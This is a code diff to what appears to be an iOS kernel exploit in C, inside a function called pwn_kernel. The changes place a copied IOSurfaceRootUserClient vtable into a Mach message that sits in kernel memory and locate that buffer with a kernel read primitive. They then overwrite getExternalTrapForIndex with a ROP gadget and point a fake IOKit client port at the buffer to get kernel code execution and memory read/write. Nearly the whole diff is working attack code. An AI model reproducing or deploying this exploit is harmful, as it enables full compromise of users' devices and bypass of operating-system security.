@@ -76,6 +76,13 @@ typedef volatile union
     } a;
 } ktask_t;
 
+typedef struct 
+{
+    mach_msg_header_t head;
+    uint64_t verification_key;
+    char data[0];
+} mach_msg_data_buffer_t;
+
 kern_return_t (^kcall)(uint64_t, int, ...);
 uint64_t (^zonemap_fix_addr)(uint64_t);
 
@@ -237,6 +244,93 @@ void release_spray_data()
 
     free(static_spray_data);
     static_spray_data = NULL;
+}
+
+// kinda messy function signature 
+uint64_t send_buffer_to_kernel_and_find(offsets_t offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
+{
+    kern_return_t ret;
+
+    buffer_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+    buffer_msg->head.msgh_local_port = MACH_PORT_NULL;
+    buffer_msg->head.msgh_size = msg_size;
+
+    mach_port_t port;
+    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    ASSERT_RET(err, "mach_port_allocate", ret);
+
+    LOG("got port: %x", port);
+
+    ret = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    ASSERT_RET(err, "_kernelrpc_mach_port_insert_right_trap", ret);
+
+    ret = mach_ports_register(mach_task_self(), &port, 1);
+    ASSERT_RET(err, "mach_ports_register", ret);
+
+    buffer_msg->head.msgh_remote_port = port;
+
+    ret = mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
+    ASSERT_RET(err, "mach_msg", ret);
+
+    uint64_t itk_registered = read64(our_task_addr + offs.struct_offsets.itk_registered);
+    if (itk_registered == 0x0)
+    {
+        LOG("failed to read our_task_addr->itk_registered!");
+        goto err;
+    }
+
+    LOG("itk_registered: %llx", itk_registered);
+
+    uint16_t msg_count = read64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
+    if (msg_count != 1)
+    {
+        LOG("got weird msgcount! expected 1 but got: %x", msg_count);
+        goto err;
+    }
+
+    LOG("msg_count: %d", msg_count);
+
+    uint64_t messages = read64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
+    if (messages == 0x0)
+    {
+        LOG("unable to find ip_messages.port.messages in kernel port!");
+        goto err;
+    }
+
+    LOG("messages: %llx", messages);
+
+    uint64_t header = read64(messages + 0x18); // ipc_kmsg->ikm_header
+    if (header == 0x0)
+    {
+        LOG("unable to find ipc_kmsg->ikm_header");
+        goto err;
+    }
+    
+    LOG("header: %llx", header);
+
+    uint64_t key_address = header + 0x20; // ikm_header->verification_key (in the msg body)
+
+    LOG("key_address: %llx", key_address);
+
+    uint64_t kernel_key = read64(key_address);
+    if (kernel_key != buffer_msg->verification_key)
+    {
+        LOG("kernel verification key did not match! found wrong kmsg? expected: %llx, got: %llx", buffer_msg->verification_key, kernel_key);
+        goto err;
+    }
+
+    uint64_t data_address = key_address + sizeof(kernel_key);
+
+    LOG("dumping data...");
+    for (int i = 0; i < 0xC0 * 0x8; i += sizeof(uint64_t))
+    {
+        LOG("%x: %llx", i, read64(data_address + i));
+    }
+
+    return key_address + sizeof(kernel_key);
+
+err:
+    return 0x0;    
 }
 
 kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
@@ -515,21 +609,54 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint64_t IOSurfaceRootUserClient_addr = ip_kobject_client_addr;
     uint64_t IOSurfaceRootUserClient_vtab = client_vtab_addr;
     
-    // copy out vtable
-    uint64_t fake_vtable = (uint64_t)fakeport + 0x4000;
-    LOG("fake_vtable @ %llx", fake_vtable);
+    // using a size of 0xC0: 
+    // iometa -Csovp IOSurfaceRootUserClient kernel | grep 'vtab=' -B 1
+    // Shows us that the highest vtab method resides at 0x5c8 within IOSurfaceRootUserClient itself
+    // 0x5c8 + 0x8 = 0x5d0
+    // 0x5d0 / 8 = 0xBA methods
+    // we can round to 64-bit aligned by adding 0x6, 0xBA + 0x6 = 0xC0 
+    size_t vtab_msg_sz = sizeof(mach_msg_data_buffer_t) + (0xC0 * sizeof(uint64_t));
+    LOG("vtab msg size: %x", vtab_msg_sz);
+ 
+    mach_msg_data_buffer_t *vtab_msg = (mach_msg_data_buffer_t *)malloc(vtab_msg_sz);
+    bzero(vtab_msg, vtab_msg_sz);
+
+    // safety check to make sure we found the right message
+    vtab_msg->verification_key = 0x4141414142424242;
+
+    LOG("about to copy vtab...");
     
-    for (int i = 0; i < 0x200; i++)
+    // copy out vtable into message body
+    for (int i = 0; i < 0xC0; i++)
     {
         uint64_t vtab_entry = 0x0;
-        kr64(IOSurfaceRootUserClient_vtab + (i * 0x8), vtab_entry);
-        *(uint64_t *)(fake_vtable + (i * 0x8)) = vtab_entry;
+        kr64(IOSurfaceRootUserClient_vtab + (i * sizeof(uint64_t)), vtab_entry);
+        *(uint64_t *)(&vtab_msg->data[i * sizeof(uint64_t)]) = vtab_entry;
     }
-    
-    // copy out cpp client object
+
+    // patch getExternalTrapForIndex
+    *(uint64_t *)(&vtab_msg->data[0xb7 * sizeof(uint64_t)]) = offsets.gadgets.add_x0_x0_ret + kslide;
+
+    // send vtab to kernel and stash the address of the buffer
+    uint64_t kernel_vtab_buf = send_buffer_to_kernel_and_find(offsets, ^(uint64_t addr)
+    {
+        uint64_t u64_read_tmp;
+        kr64(addr, u64_read_tmp);
+        return u64_read_tmp;
+    }, our_task_addr, vtab_msg, vtab_msg_sz);
+    if (kernel_vtab_buf == 0x0)
+    {
+        LOG("failed to get kernel_vtab_buf!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+
+    LOG("got kernel_vtab_buf at: %llx", kernel_vtab_buf);
+
     uint64_t fake_client = (uint64_t)fakeport + 0x2000;
-    LOG("fake_client @ %llx", fake_client);
-    
+    LOG("fake_client: %llx", fake_client);
+
+    // copy out cpp client object into message body
     for (int i = 0; i < 0x200; i++)
     {
         uint64_t obj_entry = 0x0;
@@ -538,14 +665,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     }
     
     // assign fake vtable into our fake client
-    *(uint64_t *)(fake_client + 0x0) = fake_vtable;
-    
+    *(uint64_t *)(fake_client + 0x0) = kernel_vtab_buf;
+
     // update fakeport as iokit obj & insert new fake client
     fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT;
     fakeport->ip_kobject = fake_client;
-    
-    // patch getExternalTrapForIndex
-    *(uint64_t *)(fake_vtable + (0xb7 * 0x8)) = offsets.gadgets.add_x0_x0_ret + kslide;
     
     // no longer needed
 #undef kr32
@@ -579,7 +703,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         *(uint64_t *)(fake_client + 0x48) = addr + kslide;
         return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
     };
-    
+
     /*  once we have an execution primitive we can use copyin/copyout funcs to freely read/write kernel mem  */
     
     kreadbuf = ^(uint64_t addr, void *buf, size_t len)
@@ -806,8 +930,6 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
     LOG("registered realhost->special[4]");
 
-    usleep(500000);
-
     // zero out old ports before overwriting
     for (int i = 0; i < 3; i++)
     {
@@ -816,8 +938,6 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
 
     kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
     LOG("wrote new port: %llx", new_port);
-    
-    usleep(500000);
     
     ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
     
